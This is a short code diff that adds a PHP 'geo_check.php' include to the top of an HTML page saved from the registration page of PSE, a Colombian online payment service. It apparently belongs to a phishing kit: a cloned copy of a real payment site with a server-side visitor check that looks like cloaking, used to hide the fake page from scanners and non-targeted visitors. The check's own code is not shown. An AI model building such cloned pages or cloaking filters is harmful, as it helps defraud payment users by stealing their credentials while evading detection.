@@ -1,3 +1,4 @@
+<?php require_once __DIR__ . '/../geo_check.php'; ?>
 <!DOCTYPE html>
 <!-- saved from url=(0137)https://registro.pse.com.co/PSEUserRegister/StartTransaction.htm?enc=tnPcJHMKlSnmRpHM8fAbu0K5D1U5IAOGSWtI%2fUP46QjWc%2fuRmCnDEV6lccJAYN7M -->
 <html data-lt-installed="true">
